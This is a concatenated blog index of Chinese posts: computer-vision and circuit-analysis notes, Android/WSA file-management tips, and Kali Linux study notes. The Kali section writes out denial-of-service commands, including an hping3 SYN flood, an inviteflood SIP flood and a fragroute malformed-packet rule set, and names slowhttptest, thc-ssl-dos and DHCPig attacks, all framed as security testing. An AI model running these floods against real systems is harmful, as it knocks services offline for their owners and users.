值，称为特征尺度 怎么实现特征的不变 Harris 检测的步骤 特征描述与匹配特征描述符 MOPS: 选取特征点周围 40*40 的方形窗口 缩放到 1/5 大小 旋转特征向量方向到水平 在以特征为中心的 8*8 方形窗口内采样 规格化 （强度减去平均值，除以标准差，均值为0，方差为1） SIFT：尺度不变特征转换 在所检测的特征周围取 16*16 的窗口 为每个像素计算边缘方向 去除弱的边缘方向（设定阈值） 为剩余边缘方向建立直方图 特征匹配 特征距离 更好的方法：距离比 $f_2$ 是 $f_1$ 在 $I_2$ 中最好的 SSD 匹配，$f_2^\\prime$ 次之$$距离比 = \\frac{||f_1-f_2||}{||f_1-f_2^\\prime||}$$ 测量特征匹配的性能 真正例率（TPR） （召回率） = 匹配到的真正例数 / 所有真正例数 假正例率 （FPR） = 匹配到的假正例数/所有真正例数 ROC 曲线：以 FPR 为横轴，TPR 为纵轴 AUC：曲线下的面积，越大越好 变换与卷绕什么是图像卷绕：更改图像的定义域 常见的变换 平移 欧式变换：平移+旋转 相似变换：平移+旋转+等比放缩 仿射变换：平移+旋转+等比放缩+剪切 投影变换：原来平行的线不再平行，但还是保持直线性 线性变换 等比缩放： 比例S 旋转角度 剪切 镜像 线性变换的性质 原点到原点 直线到直线 平行线保持平行 比率被保持 线性变换的组合是线性变换 平移不是 2D 坐标上的线性变换，我们需要 添加一个坐标 -&gt; 齐次坐标 仿射变换任何最后一行 为 [0,0,1] 的 3·3 矩阵表示的转换称为仿射变换，仿射变换是线性变换和平移的组合 变换完成后，平面位置不变 基本的仿射变换： 平移、缩放、2D 平面旋转、剪切 仿射变换是线性变换 + 平移 性质 原点不一定到原点 直线到直线 平行还平行 保持比率 闭包 透视变换、投影变换、同态映射 最后一元素固定为1 ，共有8个参数， 是成像平面的变换，仿射变换是特例 原点不一定映射到原点 平行线不一定保持平行 不保持比率 闭包 卷绕卷绕有两种： 前向卷绕 反向卷绕 变换后的像素位置如果不是整数： 将像素值分配给四个最近邻，记录每个点的权重并在最后归一化 效果：混叠与模糊 反向卷绕 先获取每个像素在原图像中对应的位置处的像素值 （逆变换） 如果像素位置不是整数，利用原来相邻像素值插值 可能的插值滤波器 最近邻 双线性 双三次 窗 sinc 需要防止锯齿和混叠（需要预先滤波） 变换有哪几种 卷绕有两种 卷绕之后产生了非整数值怎么办 常见的变换 旋转 平移 基本仿射变换 仿射变换的含义是什么 图像配准配准算法的流程，怎么实现 特征提取 匹配 反向变换 插值 优化方式 最小二乘法 图像配准算法给定图像 A 和 B 计算 A、B 的图像特征 匹配 A、B 之间的特征 使用匹配集计算 A 到 B 的单应映射矩阵的最小二乘解 最小化残差平方和定义残差：$$\\begin{array} { l } { r _ { \\mathbf { x } _ { i } } \\left( \\mathbf { x } _ { t } \\right) = \\left( \\mathbf { x } _ { i } + \\mathbf { x } _ { t } \\right) - \\mathbf { x } _ { i } ^ { \\prime } } \\ { r _ { \\mathbf { y } _ { i } } \\left( \\mathbf { y } _ { t } \\right) = \\left( \\mathbf { y } _ { i } + \\mathbf { y } _ { t } \\right) - \\mathbf { y } _ { i } ^ { \\prime } } \\end{array}$$将 n 个点形成的 2n 个方程写成矩阵方程：$$\\left[ \\begin{array} { l l } { 1 } &amp; { 0 } \\ { 0 } &amp; { 1 } \\ { 1 } &amp; { 0 } \\ { 0 } &amp; { 1 } \\ { 0 } &amp; { 1 } \\ { \\vdots } \\ { 1 } &amp; { 0 } \\ { 0 } &amp; { 1 } \\end{array} \\right] \\left[ \\begin{array} { l } { x _ { t } } \\ { y _ { t } } \\end{array} \\right] = \\left[ \\begin{array} { c } { x _ { 1 } ^ { \\prime } - x _ { 1 } } \\ { y _ { 1 } ^ { \\prime } - y _ { 1 } } \\ { x _ { 1 } ^ { \\prime } - x _ { 2 } } \\ { y _ { 2 } ^ { \\prime } - y _ { 2 } } \\ { \\vdots } \\ { x _ { n } ^ { \\prime } - x _ { n } } \\ { y _ { n } ^ { \\prime } - y _ { n } } \\end{array} \\right]$$ $$At =b$$ 找到 t ，最大限度的减少$$| \\mathbf { A } \\mathbf { t } - \\mathbf { b } | ^ { 2 }$$ $$\\begin{array} { c } { \\mathbf { A } ^ { \\mathrm { T } } \\mathbf { A } \\mathbf { t } = \\mathbf { A } ^ { \\mathrm { T } } \\mathbf { b } } \\ { \\mathbf { t } = \\left( \\mathbf { A } ^ { \\mathrm { T } } \\mathbf { A } \\right) ^ { - 1 } \\mathbf { A } ^ { \\mathrm { T } } \\mathbf { b } } \\end{array}$$ 对于仿射变换：$$\\left[ \\begin{array} { l } { x ^ { \\prime } } \\ { y ^ { \\prime } } \\ { 1 } \\end{array} \\right] = \\left[ \\begin{array} { l l l } { a } &amp; { b } &amp; { c } \\ { d } &amp; { e } &amp; { f } \\ { 0 } &amp; { 0 } &amp; { 1 } \\end{array} \\right] \\left[ \\begin{array} { l } { x } \\ { y } \\ { 1 } \\end{array} \\right]$$有六个未知数，每个匹配有两个方程，我们需要三个匹配 残差：$$\\begin{aligned} r _ { x _ { i } } ( a , b , c , d , e , f ) &amp; = \\left( a x _ { i } + b y _ { i } + c \\right) - x _ { i } ^ { \\prime } \\ r _ { y _ { i } } ( a , b , c , d , e , f ) &amp; = \\left( d x _ { i } + e y _ { i } + f \\right) - y _ { i } ^ { \\prime } \\end{aligned}$$对于同态映射（透视变换）$$\\left[ \\begin{array} { c } { x _ { i } ^ { \\prime } } \\ { y _ { i } ^ { \\prime } } \\ { 1 } \\end{array} \\right] \\cong \\left[ \\begin{array} { l l l } { h _ { 00 } } &amp; { h _ { 01 } } &amp; { h _ { 02 } } \\ { h _ { 10 } } &amp; { h _ { 11 } } &amp; { h _ { 12 } } \\ { h _ { 20 } } &amp; { h _ { 21 } } &amp; { h _ { 22 } } \\end{array} \\right] \\left[ \\begin{array} { c } { x _ { i } } \\ { y _ { i } } \\ { 1 } \\end{array} \\right]$$ $$\\begin{aligned} x _ { i } ^ { \\prime } \\left( h _ { 20 } x _ { i } + h _ { 21 } y _ { i } + h _ { 22 } \\right) &amp; = h _ { 00 } x _ { i } + h _ { 01 } y _ { i } + h _ { 02 } \\ y _ { i } ^ { \\prime } \\left( h _ { 20 } x _ { i } + h _ { 21 } y _ { i } + h _ { 22 } \\right) &amp; = h _ { 10 } x _ { i } + h _ { 11 } y _ { i } + h _ { 12 } \\end{aligned}$$ Ah = 0 的非平凡最小二乘解，即为 $A^TA$ 具有最小特征值的特征向量 RANSAC 随机抽样一致如何计算 随机抽取 计算匹配误差 Ransac 算法 随机选择 S 个样本 通常 s 等于可以求解模型的最少样本数量 使用这 s 个样本求得一个解 计数符合模型的 inliers 数 重复 N 次 选择具有最多 inliers 数的模型 使用所有的 inliers 点，采用最小平方拟合 实验轮数的确定 $p$ 数内点的概率 $s$ 是每次实验使用样本点的数目 $P$ 为实验最终成功找到正确解的概率 $R$ 为实验轮数 $$\\begin{array} { l }","link":"/2023/11/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"第一章：电路的基本规律","text":"本章主要关于电路的基本定理、基本器件以及电路的等效变换。 电路的等效对于任何电路A，如果C和B接在A的端子上，电压、电流、功率完全一样，则称C与B等效。 例1： “等效”是对于外电路而言的。因此，当外电路A发生变化时，C和B依旧等效才能称作等效。 例2： 如图，将两个电阻替换成一个电阻，从而化简电路。 串并联等效 串联等效 特征：流过各电阻的电流是同一电流。 阻值和分压成正比 并联等效 电导是电阻的倒数，即 $G = \\frac{1}{R}$ ，单位是 $S$ 混联等效 即：既有串联，又有并联 观察电路的结构特点和电压、电流关系 很快就能算出 $R_{eq}=1.5\\Omega$ $\\Delta$形Y形连接等效 问题的提出 等效 其中，2个支路的电流和电压独立。 对于图a中的三个支路，由KCL和OL得到关系： 图b中，由KVL得： 式3、5和式4、6应恒等。 结论：从 $\\Delta$到Y： $$R_1=\\frac{R_{12}R_{13}}{R_{12}+R_{13}+R_{23}}\\R_2=\\frac{R_{12}R_{23}}{R_{12}+R_{13}+R_{23}}\\R_3=\\frac{R_{13}R_{23}}{R_{12}+R_{13}+R_{23}}\\$$ 从Y到 $\\Delta$： $$R_{12}=\\frac{R_1R_2+R_2R_3+R_3R_1}{R_3}\\R_{23}=\\frac{R_1R_2+R_2R_3+R_3R_1}{R_1}\\R_{13}=\\frac{R_1R_2+R_2R_3+R_3R_1}{R_2}\\$$ 同时，若 $R_1=R_2=R_3=R_Y$，则 $R_{12}=R_{23}=R_{13}=R_\\Delta$，且 $R_\\Delta=3R_Y$ 举例 这是一个桥接电路。 含受控源电阻的等效 如图，u、i参考方向关联，因此定义其端口等效电阻为： $$R_{eq}=\\frac{u}{i}$$ $R_{eq}$的计算使用外加电流的方法：外加独立电流/电压源得到伏安关系，从而得到 $R_{eq}$。 例1 解题关键就是计算得到 $u$ 和 $i$，此时就可利用定义式得到等效电阻。 例2 独立源的串并联等效 电压源串联而成的二端电路，可以等效成一个电压源，其值为几个电压源的电压值代数和。 注意；方向一致、电压相等的电压源才能并联，否则违背KVL 多个电流源可以并联，等效为一个电流源，其值为各电流源 电流值的代数和。 同样地，电流值一致且方向相等的电流源才能串联，否则违背KCL 电流源与电压源/电阻串联：对外只等效为电流源。 电压源和电流源/电阻并联：对外只等效为电压源。 电源等效后的外特性不变。 实际电源的模型将实际电源（例如干电池）外接滑动变阻器，得到其电源特性曲线： 令 $\\frac{U_s}{I_s}=R_s$，得到解析式为： $$u=U_s-R_si$$ 这就是实际电源的电压源模型：电压源和内阻 $R_s$ 的串联。 若将表达式变形为关于 $i$ 的函数，则： $$i=I_s-\\frac{u}{R_s}$$ 这就是实际电源的电流源模型：电流源和内阻 $R_s$ 的并联。 两模型的互换等效由于前面两者的VCR（伏安关系）相同，所以实际电源的这两种模型电路是等效的。这也适用于受控电压/电流源，也就是说，受控源也可以等效互换。 互换时要注意电压源的电压极性与电流源电流的方向之间的关系。 例1 上面的例子通过源的等效变换和独立源的串并联等效，将电路化简为只含两个电源的电路，大大简化了电路。 例2 上面例题的关键是根据公式 $i=I_s-\\frac{u}{R_s}$将实际电源变形为电流源。完成之后进行正常的电源等效合并简化电路即可。 总结 一个实际电路对应两个理想电源模型 实际电源的两种等效理想电源模型：$$i_S=\\frac{u_S}{R_S} \\u_S=R_Si_S$$ 电路等效变换过程中，电路结构会发生变化，注意未知量是否变化 受控电压源/电流源+电阻也可以等效变换，不过注意变换过程中，控制两必须保留 电源的等效转移电压源-等效变换利用了bcde结点电位相等的特点，将电压源分拆到三路上。转移后的各回路的KVL方程应不变。 例如： 上图中有两种拆法，既可以拆到左边也可以拆到右边。 例1 电流源-等效变换从起点开始，选择一回路到终点，每条支路并联。转移后的KCL方程应保持不变。 例2 电桥顾名思义，“桥”是起连接作用的。电桥所连接的，则是电路。 将两个支路用电阻 $R_5$相连接，则 $R_1 \\dots R_5$就形成了一个电桥。 $R_5$就是桥接电阻。 平衡电桥 在上图中，如果存在： $$R_1R_4=R_2R_3$$ 则会有A,B两点等电位。这即是平衡电桥。 显然，平衡电桥具备下面的性质： 等电位点间连接任意电阻，都不影响外电路的支路量 也就是说，平衡电桥可以看作开路。 同时，将 $R_4$换为可调节电阻 $R$，电桥换为电流计 $A$，即可测量 $R_1$的阻值： $$R_x=\\frac{R_2R_3}{R}$$","link":"/2022/10/19/%E7%89%A9%E7%90%86/%E5%BE%AE%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E7%94%B5%E8%B7%AF%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%A7%84%E5%BE%8B/"},{"title":"第二章：电阻电路分析","text":"KCL/KVL独立方程KCL独立方程 对于n个结点的连通图，有且仅有n-1个独立方程。 任取n-1个结点写出的KCL方程相互独立，且能列出独立方程的结点称为独立结点。 KVL独立方程 对于有n个结点，b条支路的连通图，有且仅有(b-n+1)个独立的KVL方程。将能列出独立KVL方程的回路称为独立回路。常用的独立回路： (b-n+1)个基本回路 平面电路的(b-n+1)个网孔 2b法/支路法电路分析的任务，就是求出未知的支路电压和支路电流。标题所述的，就是求解电路最基本的两种方法。手工分析时，计算较为繁琐 2b法以b个支路电压和b个支路电流为未知变量列写并求解方程的方法称为2b法。 下面以上图为例，说说列写步骤： 在a、b、c三个结点列写出(n-1)=3个独立KCL方程；选网孔列写出(b-n+1)=3个独立KVL方程。 根据元件的伏安关系，每条支路又能列写b=6个支路电压和电流方程。 解上述2b=12个独立方程，求出支路电流和电压。 支路法以支路电流/电压为未知量列出方程，求解支路电流/电压，称为支路电流/电压法。 步骤如下： 选定各支路电流参考方向 对n-1个独立结点，列出独立KCL方程 选定b-n+1个独立回路（基本回路或网孔），指定回路绕行方向，根据KVL和OL列出回路电压方程。列写过程中，将支路电压用支路电流来表示 联立求解上述b个支路电流方程，求解题述的支路电压/功率 例1 此处是重点！！！对于无伴电流源（也就是支路上只有一个电流源）的处理方法是，在其两端设定一个电压U，然后后续的回路法计算中，忽略它的电流。 回路法/网孔法回路法，顾名思义，是以一组独立回路电流为变量并列出由前者表达的KVL方程的求解方法。通常选择基本回路为独立回路。这时，回路电流就是相对应的连枝电流。 对于上图（a），选定三个回路之后，对于节点123，根据KCL可得到各树枝电流为 $$\\left{\\begin{aligned}i_4&amp;=i_1-i_2\\i_5&amp;=i_1+i_3\\i_6&amp;=-i_2-i_3\\\\end{aligned}\\right.$$ 将上式和上图对照，可得到树枝电流等于流经相关各回路电流的代数和。 随后，对于各回路应用KVL，并将其中的支电流改用回路电流表示，从而就得到了回路法的方程组。 戴维南等效电路内容：一个线性含源网络N可以用一个电压源和一个电阻的组合等效代替。 其中，电压源记作$u_{oc}$，电阻记作$R_0$。 显然，使用该定理能够简化很多电路问题的求解。下面介绍戴维南等效电路的求法。 戴维南等效电阻的求解大致有四个方法。不含受控源的有一种，含有受控源的有三种。 独立源置零法将无受控源电路网N中的独立源置零，随后根据电路串并联关系和星角变换等方法求出从端口看进去的等效电阻$R_0$。 这里所说的独立源置零指的是：电压源替换为导线，电流源替换为开路。 外加电源法令N中所有独立源置零，保留受控源，随后外加独立源。如果外加电流源，就以电压为响应；相反则以电流为响应。最后就能计算得出：$$R_0=\\frac{u}{i}$$ 注意，对于电路网N而言，u和i是关联参考方向；但是对于外加的独立源而言，u和i是非关联参考方向。 上面的例题中，i可以是给定的，也可以是变量。 开路短路法计算电路的开路电压$u_{oc}$，短路电流$i_{sc}$，即可根据二者和$R_0$的关系求得$R_0$。 总结： 不含受控源的戴维南等效内阻的求解：独立源置零，运用电阻的串并联来求解其等效内阻 含受控源的戴维南等效电阻的求解：*外加电源法和开路短路法，以及端口的伏安关系法。*","link":"/2022/10/31/%E7%89%A9%E7%90%86/%E5%BE%AE%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E7%94%B5%E9%98%BB%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90/"},{"title":"WSA文件管理","text":"ADB传输文件在电脑装Phigros的时候（别问，问就是闲的）发现obb是分离的，于是尝试用ADB直接push到Android/data/com.PigeonGames.Phigros/目录下，报错，提示权限不足。后来传到/sdcard/下再移动进去才成功了。 12345678910111213# 连接到wsaadb connect 127.0.0.1:58526# 传文件到wsaadb push D:\\download\\main.43.com.PigeonGames.Phigros.obb /storage/emulated/0/Android/# 进入shelladb shell# 创建目标目录cd /storage/emulated/0/Android/obb/mkdir com.PigeonGames.Phigros# 将文件移到目标位置mv ../main.43.com.PigeonGames.Phigros.obb ./com.PigeonGames.Phigros# 退出exit 到此完成。 给WSA安装程序记下你的安装包的路径，打开终端，按照上面的步骤连接设备后，输入： 1adb install /path/to/app.apk 随后等待安装完成即可。","link":"/2022/05/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Android/WSA%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86/"},{"title":"浅谈Android存储清理","text":"前些天有个同学让我帮忙清理下她手机。二话不说，打开文件管理就是干。我一看，好家伙。那个根目录啊，不可描述一般的乱（反正我翻了半天才到底）。 现在大概总结下相关的基本常识。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960/sdcard├── Android│ ├── data│ ├── media│ ├── obb│ └── obj├── BaiduMapSDKNew│ └── crash├── DCIM│ ├── Camera│ └── Screenshots├── Download│ └── woodbox├── MIUI│ ├── Gallery│ ├── MiDrop│ ├── debug_log│ └── music├── Movies├── PerfectPiano│ └── Soundbank├── Pictures│ ├── CoolMarket│ ├── WeiXin│ └── woodbox├── amap│ └── openamaplocationsdk├── backups├── baidu├── bluetooth├── browser│ ├── MediaCache│ └── dumps├── com.miui.voiceassist│ └── audio├── documents│ └── 1994036591├── downloaded_rom├── iFlyIME│ ├── Download│ ├── imagecache│ ├── imageloadercache│ └── puser├── miad│ └── cache├── netease│ └── cloudmusic├── tencent│ ├── MobileQQ│ ├── QQLite│ ├── QQ_Favorite│ ├── QQ_Images│ ├── QQfile_recv│ ├── ams│ ├── msflogs│ ├── mta│ ├── tbs│ └── wtlogin└── tv.danmaku.bili └── source 第一重地狱：/sdcard下的一般目录这就是我手机的根目录。可以很清楚地看到，根目录下的文件夹大致可以分成以下两类： 程序公用目录例如/DCIM，/Download，/Music，/Pictures，/bluetooth，/Movies等等（这里比较多，就不全列出来了）。这类目录大部分是不能随意删除的。他们是各个程序的公用目录和程序的汽油，也就是说，它们里面会有各个程序保存的文件。 比如打开/Pictures，你就会看到里面有系统的屏幕截图，基安酷安之类软件保存的图片之类的。 再比如说/Download，这是系统创建的下载目录，浏览器之类的都会把文件下载到这里。/bluetooth顾名思义，通过蓝牙传输的文件保存的目录。如果有用蓝牙传过什么重要的文件，那么最好不要删。 /DCIM是各个程序公用的相册目录，一般微信，QQ之类的都会在这里面读取照片（所以说下次微信QQ找不到图片的话就把图片扔到这里面随便哪个文件夹就好了×）。最重要的是，系统相机拍摄的图片、录制的视频也全都在这里面。所以这个目录千万千万别手滑删掉。要不然……后果会很惨烈（当然如果你不关心你的照片就另说了×）。 其他文件夹（比如/Music，/Movies，/documents之类的）也都顾名思义，是存放相应类型文件的专用共享目录。不过因为国内畸形的安卓生态，它们大多都没有发挥应有的功能。 /Android目录 这是系统最重要的目录，没有之一。可以说基本所有软件的数据都在它里面保存着，接下来我们就要着重分析下这个目录。 ``Android├── data├── media├── obb└── obj 这四个目录中，属/data最重要。它是系统分配给每个软件的私有目录。软件可以把自己的各种数据保存在里面。比如猿辅导，就会把离线的网课保存在里面。再比如说，最新版的QQ和微信也都把自己的数据（接收的文件，保存的图片之类的）存储在里面了。里面的文件夹和软件的包名是一一对应的。（不知道这是个啥？百度下吧）。所以一般这里也不怎么经常清理。 其他几个目录的话，obb是存储程序数据包的。比如说FL Mobile，还有MC:Story mode之类的。一般来说，这个目录里的文件夹也是和包名一致的。另外几个我还没怎么了解过，后面了解了再说说吧。 *好了，还有什么人要提问*(bushi 那么就是剩下的目录了。从这里开始，就是一些非标准但是占内存比较大的目录了。 第二重地狱：/sdcard/tencent目录顾名思义，这个目录是腾讯系软件的主目录。 这里得先提前说明一下，按照规范来说，根目录下是不应该允许程序写入文件的。 但是隔着这么高的墙，谷歌哪里管得上啊（摊手 这里要注意一下，现在其实是有两个目录的。一个在Android/data/中，另一个就是下面这个了。 123456789101112/sdcard/Tencent/├── MobileQQ├── QQLite├── QQ_Favorite //QQ收藏的表情├── QQ_Images //QQ保存的图片├── QQfile_recv //QQ接收的文件├── ams├── micromsg //微信目录├── msflogs├── mta├── tbs //x5浏览器内核？└── wtlogin 看起来挺乱的对吧？我也这么觉得。大概分析下构成，占地方大的主要是MobileQQ，里面包含了缓存和聊天记录等。还有就是micromsg，包含了微信接收的文件和聊天记录等。","link":"/2021/05/17/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Android/%E6%B5%85%E8%B0%88Android%E5%AD%98%E5%82%A8%E6%B8%85%E7%90%86/"},{"title":"红米Note7刷机小记","text":"好久没刷了，有些手生 以前刷机很简单，直接手机工具root，手机端刷入rec，下好卡刷包，开刷就完事了。 现在稍微复杂一些了。比如我手上的红米note7，我需要先解锁手机，再在电脑上用fastboot刷入rec镜像，还得在手机上再刷一遍zip版本的rec才行。一切完成后，才能下卡刷包，刷机。 而且刷的时候还要注意底包等一系列的东西。 总的来说，因为vendor等一堆新东西的出现，改变了刷机的流程（或许这个流程以前就有，只是现在成了主流）。虽然流程变麻烦了，但是因为vendor的出现，刷机包的制作似乎是简单一些了。 所以总的来说还是值得的。 MIUI EU简单说下使用体验。很稳，稳如老狗，功能啥的都不缺。 自带谷歌系应用全部删掉，应用市场换成酷安，就不用忍受analytics了。应用更新一下，该有的都有了，而且还流畅。 反正是比官方的流畅舒服。这也是我刷机的原因：系统更新直接给我把后台长按操作给砍了。😂 输入法用的讯飞的，还不错。没有安全键盘（其实好像也没啥必要）和输入法MIUI优化（就是底下那个条和左右两个键），用着还行。控制中心终于是实时高斯模糊了。 系统主题自带全套超级壁纸，还有其他一堆被砍掉的功能，基本上是MIUI完全体了。","link":"/2021/09/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Android/%E7%BA%A2%E7%B1%B3Note7%E5%88%B7%E6%9C%BA%E5%B0%8F%E8%AE%B0/"},{"title":"Kali Linux学习笔记","text":"参考资料：Learning Kali Linux by Ric Messier(O’Reilly). Copyright 2018 Ric Messier, 978-1-492-02869-7 Kali Linux目前是一个基于debian的发行版，它专注于安全测试相关的方方面面，并提供了一系列的专业工具供测试人员使用。这篇笔记包含以下几个方面： Kali Linux 入门 网络安全测试基础 侦察 寻找漏洞 自动化漏洞利用 Metasploit进阶 无线安全测试 Web应用测试 破解密码 高级技术 报告 这篇笔记中，将简要记录相关资料。 0x01.Linux基础Linux是一个面向多用户的操作系统内核，基于Linux内核，世界上有着众多Linux发行版，如Ubuntu，Open BSD，Debian，Deepin Linux等。Kali 是一个基于Debian的发行版，包含有很多计算机安全相关工具。下面涉及到的，是Linux的基本使用方法。有使用经验的读者可以跳过/速览此部分 0x01a.文件操作Linux文件系统结构同UNIX一样，具有通用布局。系统中的磁盘都会归于/（根文件夹）目录下。在根文件夹下通常有以下几个公共目录： /bin 单用户模式下引导系统时必须可用的命令/二进制文件 /boot 系统引导文件，包括引导加载器的配置，内核，以及启动内核所需的初始ramdisk文件 /dev 伪文件系统，包含用于程序访问硬件设备的条目 /etc 与操作系统和系统服务相关的配置文件 /home 包含用户主目录的目录 /lib 包含任何程序都可用使用的共享代码和函数的库文件 /opt 可选的第三方软件 /proc 伪文件系统，包含与运行进程有关的文件，包括内存映射，用于以运行程序的命令行，以及与程序相关的其他基本系统信息 /root root用户的根目录 /sbin 系统二进制文件，同时也需要在单用户模式下可用 /tmp 存放临时文件的文件夹 /usr 只读用户数据（包括bin，doc，lib，sbin和共享子目录） /var 变量数据，包含运行进程、日志文件、运行时数据，以及其他临时文件的状态信息。在系统运行期间，这些文件的大小和存续都会发生变化 启动Kali，然后用你的账户登录。默认会进入图形化界面。此时你需要使用Ctrl+Shift+T（或者在左上角菜单中找到终端并点击）来打开终端（Terminal）。 终端是和系统/软件交互的重要工具，即使只使用图形化工具也应当熟悉，因为大部分工具的命令行版本更加易用，有时也能看到图形界面无法查看的日志信息。 在终端中，输入程序名称以运行程序。输入部分名称并按Tab可以补全指令，上下键可以查看指令历史记录。 可以看到，每一行的开头通常包括username@hostname:[workdir]。其中，username表示当前用户名，hostname表示主机名，workdir表示当前所在的目录。 要查看当前目录下的文件，输入ls并回车。这表示使用ls程序查看当前目录下的文件列表。程序可以附加参数，输入ls -la以长列表（-l）形式显示所有（-a）文件。这条指令中的-la就是附加的参数，它也可以写成-l -a的形式。 cd [目录路径] 切换到指定路径。.表示当前路径，..表示上一层路径 touch [文件路径] 修改文件的访问时间为此刻（和字面意思一样，“摸”一下文件），不存在则创建空文件 chmod (-R) OOO [路径] 修改文件/文件夹权限，三位从左到右：读r写w执行x，三位合并为8进制数，权限有三组，所有者，组，访客（所有人），对应三位8进制数。flag-R表示递归（Recursive），表示更改文件夹和其下所有子文件 locate [文件名] 查找数据库获得文件位置 witch [文件名] 查找path变量中的可执行程序 find [dir] -name [filename] [-print] 递归查找文件，支持正则（需用双引号包围表达式） rm [-r] [路径] 删除文件/文件夹。删除文件夹时，需要使用-r参数。删除前务必确认删除对象是否正确！！！ 0x01b.其他常用指令终端还有其他实用工具，它们涵盖进程管理、权限管理、用户管理、网络工具等相当全面的工具。以下列举几个： cat [文件路径] 输出文件内容到终端 ps 获取进程列表 man 获取帮助手册 top 获取进程列表，使用q或Ctrl+C退出 kill -9 [pid] 终止进程 killall [pid/进程名] 终止进程 adduser/useradd 创建用户 终端的更多用法有大量其他专业资料，此处不再赘述。 0x02.网络安全测试基础0x021.安全测试在提到安全测试之前，需要知道安全性的定义。这通常包含三个基本要素：机密性、完整性和可用性。任何影响系统/软件这些方面之一的内容都会影响软件或系统的安全性。安全测试并不局限于渗透测试提供的观察视角。 0x022.网络安全测试 监控的重要性 保证服务和硬件正常运行 可以用nagios监控进程和硬件使用率 报告有助于重现问题 可以用nc/telnet手动测试服务端口 0x0211.压力测试一些软件/硬件难以处理大负载的流量。引起这的原因多样，因此，必须预先测试系统以保证负责的系统不会在发生不良事件时瘫痪。下面有几种相关工具： fragroute 用于破坏和操作来自自己系统的数据包，并将其发往指定IP。下面是一组配置，用于模拟错误的数据包： 123456ip_chaff dup 7ip_frag 64 newdrop random 33dup random 40order randomprint 上述配置文件中，第一行声明IP数据包应当重复交错。7表示生存事时间字段的值为7跳。这会使得数据包在传输的过程中丢失。第二行表示以64字节为单位对IP数据包进行分段。new表示让fragroutes使用新数据而不是旧数据对数据包进行重叠。有33%的情况将会丢弃数据包，有40%的情况会随机复制数据包。fragroute也会随机化数据包命中线缆的顺序，这意味着在理想情况下，它到达端点时，正确序列中将不存在任何内容。最后，print表示相关细节会被打印出来，说明对收到的数据包执行的操作。 将上述文件另存为frag.rules中，在终端中切换到该文件所在路径，并键入fragroute -f frag.rules 192.168.5.40，回车，即可开始测试目标是否能正确处理错误的数据包。 上述指令中，frag.rules是配置文件名，192.168.5.40是发送乱码流量的目标地址。可以根据实际情况更改参数。 hping3 是一个压力测试工具，用于测试系统处理网络堆栈，硬件，传输层的能力。系统会为TCP连接保留一小块内存，一般很难发生溢出。 1hping3 --flood -S -p 80 192.168.86.1 上述指令演示了利用hping3进行SYN洪水测试的方法。-S表示SYN消息，-p 80表示80端口，--flood表示泛洪模式。 inviteflood 用于发动SIP洪水攻击。 1inviteflood eth0 kilroy dummy.com 192.168.86.238 150000 上面表示，指定inviteflood作为发送信息的接口。接下来是用户名和相关域名，也可能是IP地址。 对于IPV6，Kali也提供了相应的测试工具：na6，ns6，ra6，rs6，tcp6等。 压力测试时，尽可能多地保留说明信息。 0x0212.拒绝服务工具slowhttptest Kali提供了其以模拟Slowris攻击。除此以外，它还可以发动R-U-Dead-Yet攻击、Apache Killer攻击等。 thc-ssl-dos 提供了基于SSL的压力测试。其基本想法是加密计算成本高昂，尤其在服务端更是如此。 DHCPig 可以发动DHCP攻击：在客户之前取得到期租约，以此耗尽DHCP服务器中可用的资源，让客户在无法获得IP的状态下处于离线状态。运行pig.py选择目标即可。 0x023.加密测试加密领域面对的挑战是：双方在不能面对面交流的时候，如何交换密钥来加密传递信息？这很困难。目前广泛使用的协议是TLS协议，即便如此，它也经过了数个版本的更迭。 sslscan 用于检查服务器是否使用过时协议。用法很简单：sslscan [ip] 输出结果将确定服务器是否会收到Heartbleed漏洞的攻击，该漏洞会针对服务器/客户端加密，导致密钥暴露给用户。同时，sslscan会为我们提供支持的密码列表。第一列表示协议和密码套件是否被接受以及他们是否为首选项。你会注意到TLS的每个版本都有自己的首选密码套件。第二列是协议和版本；接下来的列表示密钥强度。随后的列是密码套件，这称呼是因为它考虑了具有不同用途的多种算法。例如：DHE-RSA-AES256-SHA256，这表示它使用Diffie-Hellman方法进行临时的密钥交换。随后的RSA是一种非对称加密算法，用于验证通信的双方，因为密钥还存放在包含服务器验证信息的证书中。如果客户端也有该证书，则可以相互进行身份认证。否则，客户端可以根据要访问的主机名和证书中列出的主机名对服务器进行身份验证。非对称加密还用于加密客户端和服务器之间发送的密钥。 AES是加密会话的算法。这意味着用于会话的密钥是256位的。它是初始会话被派生和共享的密钥。如果会话持续的时间足够长，则可以重新创建会话密钥以防止密钥派生攻击。密钥被会话双方用于加密和解密。 SHA256算法用于验证数据是否被更改，和MD5类似。 所有这些算法构成TLS协议和之前的SSL协议。 如果输出中有类似3DES的内容，那么将会获得一个服务器会话密钥容易受到攻击的示例。这可能导致密钥泄露，继而相关的文件被解密成纯文本，造成信息泄露。 极个别情况下，我们可能在AES256的位置看到NULL值，这意味着请求没有使用加密协议。其原因较为复杂，可能是用户不太关心传输内容。 